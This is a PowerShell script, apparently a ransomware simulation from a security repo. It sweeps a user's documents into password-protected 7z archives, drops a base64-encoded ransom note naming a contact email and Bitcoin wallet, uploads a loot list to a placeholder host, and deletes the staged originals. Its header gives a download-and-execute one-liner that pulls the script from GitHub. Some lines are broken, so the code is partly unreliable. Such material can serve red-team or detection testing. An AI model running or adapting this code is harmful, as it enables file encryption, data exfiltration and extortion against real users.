## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/payload-pandemicpanda-7z.ps1')"

# gather all targets 
$targets = gci -Path c:\users\$env:USERNAME  -Recurse -Include *.pdf,*.txt,*.doc*,*.ppt*,*.xls*

# make new targetfolder

if (-not (Test-Path -Path c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted)) {
    New-Item -Path c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted\input -ItemType Directory
}


# copy all targets to targetfolder
Copy-Item $targets c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted\input -Force

# Set the folder path where your files are located
$folderPath = "c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted\input"

# Set the password for encryption
$password = "supersecretsaucepassword"

# Define the output folder for the encrypted files
$outputFolder = "c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted"

# Define the output folder for the ransom note
$ransomFolder = "c:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted"

# Set the output file for saving file paths and names
$lootFile = "C:\users\$env:USERNAME\desktop\oh_noes_your_files_were_encrypted\$nodename.loot.csv"

<# Create the output folder if it doesn't exist
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -Path $outputFolder -ItemType Directory
}#>

# Get the current date in the desired format (yyyyMMdd)
$date = Get-Date -Format "yyyyMMdd"

# Get the current date in the desired format (yyyyMMdd)
$nodename = "$Env:COMPUTERNAME"

# Iterate through all files in the specified folder
$files = Get-ChildItem -Path $folderPath


# server to post data to
$webServerUrl = "host.example.com/loot/$nodename.loot.csv"

foreach ($file in $files) {
    # Define the output file with ".7z" extension
    #$outputFile = Join-Path -Path $outputFolder -ChildPath ($file.BaseName + ".7z")
    # Generate 12 random characters
    
    $fileHash = Get-FileHash $outputFile -Algorithm MD5
    $md5Hash = $fileHash.Hash

    $randomChars = -join(((65..90)+(35..38)+(97..122) | % {[char]$_})+(0..9) | Get-Random -Count 12)


    $outputFile = Join-Path -Path $outputFolder -ChildPath ("$randomChars-$date-$nodename-kayw0zkr3w.k3k")
    

    # Use 7z to encrypt the file with the provided password
    $args = @(
        "a",                # Add to archive
        #"h",                # hash all files
        "-mx=1",            # Maximum compression
        "-p$password",      # Set the password
        $outputFile,        # Output .7z file
        $file.FullName      # Input file

        # Append the file path and name to the output file
    Add-Content -Path $lootFile -Value "$file,$outputfile,$md5Hash"


    )

    & "C:\Program Files\7-Zip\7z.exe" $args
}



# Notify when the process is complete

# set ransom note

# Base64-encoded string
$base64EncodedString = "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8dGl0bGU+b2ggbjBlcyE8L3RpdGxlPgo8aGVhZD4KPC9oZWFkPgo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpibGFjazsiPjxoMT5yYW5zMG13NHIzIG4wdGU8L2gxPgo8ZGl2Pgo8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+CllvdXIgbmV0d29yayBoYXMgYmVlbiBwZW5ldHJhdGVkISBCeSB1cyEhITwvcD4mbmJzcDsKPHAgc3R5bGU9ImZvbnQtc2l6ZToyMHB4OyBjb2xvcjogd2hpdGUiPkFMTCBmaWxlcyBvbiBBTEwgbWFjaGluZXMgaW4geW91ciBuZXR3b3JrIGhhdmUgYmVlbiBlbmNyeXB0ZWQgd2l0aCBhIHN0cm9uZyBhbGdvcml0aG0gd2hpY2ggaXMgbm90IE1ENSwgaGFoYSE8L3A+CgogCiA8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+V2UgaGF2ZSBleGNsdXNpdmUgcmlnaHRzIHRvIHRoZSBkZWNyeXB0aW9uIHNvZnR3YXJlLCBkbyB5b3Ugd2FudCBpdCBodWg/IFRoZW4gcGF5ITwvcD4KCgo8cCBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGNvbG9yOiByZWQiPkRPIE5PIFJFU0VUIE9SIFNIVVRET1dOIE1BQ0hJTkVTLCBUSEVZIE1BWSBCRSBEQU1BR0VEIElGIFNIVVRET1dOPC9wPgoKPHAgc3R5bGU9ImZvbnQtc2l6ZTozMHB4OyBjb2xvcjogcmVkIj5ETyBOT1QgUkVOQU1FIE9SIE1PVkUgRU5DUllQVEVEIEZJTEVTITwvcD4KCjxwIHN0eWxlPSJmb250LXNpemU6MzBweDsgY29sb3I6IHJlZCI+RE8gTk9UIFJFVkVSU0UgRU5HSU5FRVIgVEhFIFJBTlNPTVdBUkUsIElUJ1MgTk9UIEFMTE9XRUQhPC9wPgoKPHAgc3R5bGU9ImZvbnQtc2l6ZTozMHB4OyBjb2xvcjogcmVkIj5ETyBOT1QgQ0FMTCBCQVRNQU4sIEhFJ1MgQlVTWSBFTFNFV0hFUkUhPC9wPgoKCjxwIHN0eWxlPSJmb250LXNpemU6MjBweDsgY29sb3I6IHdoaXRlIj5UbyBnZXQgaW5mbyBvbiBob3cgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLCBjb250YWN0IHVzIGF0IDwvcD4KCjxwIHN0eWxlPSJmb250LXNpemU6MjBweDsgY29sb3I6IG1hZ2VudGEiPnA0bmQzbTFjcDRuZDRAdHV0YW5vdGEuY29tPC9wPi4gCgo8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+KE5vLCB5b3UgY2Fubm90IGNhbGwgdXMsIHRoYXQgd291bGQgYmUgdmVyeSBleHBlbnNpdmUgYXMgd2UgYXJlIGxvY2F0ZWQgaW4gQ2hpbmEuKTwvcD4KCiA8cCBzdHlsZT0iZm9udC1zaXplOjIwcHg7IGNvbG9yOiB3aGl0ZSI+T3VyIEJUQyB3YWxsZXQ6IDwvcD4KPHAgc3R5bGU9ImZvbnQtc2l6ZToyMHB4OyBjb2xvcjogZ3JlZW4iPjEydDlZRFBnd3VlWjlueU1ndzUxOXA3YUFBOGlzanI2U013PC9wPlJlZ2FyZHMsIHA0bmQ0Lgo8aW1nIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL2theXdvei9rYS9ibG9iL21haW4vZmlsZXMvcGFuZGEtbWFzY290LWxvZ28tZnJlZS12ZWN0b3IuanBnP3Jhdz10cnVlIiBzdHlsZT0id2lkdGg6NTAwcHg7aGVpZ2h0OjYwMHB4OyI+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4="

# Decode the Base64-encoded string to bytes
$bytes = [System.Convert]::FromBase64String($base64EncodedString)

# Convert the bytes to a string (assuming it's a text-based content)
$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)

# Output the decoded string
 $ransomNote = Join-Path -Path $ransomFolder -ChildPath ("r4ns0mn0t3.html")
Add-Content -Value $decodedString -Path $ransomNote

# You can also send the encrypted 7z files to your web server here using Invoke-RestMethod
# Example:
$body = get-content "$lootFile"
Invoke-RestMethod -Uri $webServerUrl -Method Put -body $body

# remove all original files
Remove-Item $folderPath -Recurse -Force
#remove loot file
Remove-Item "$lootFile"


Write-Host "done..."
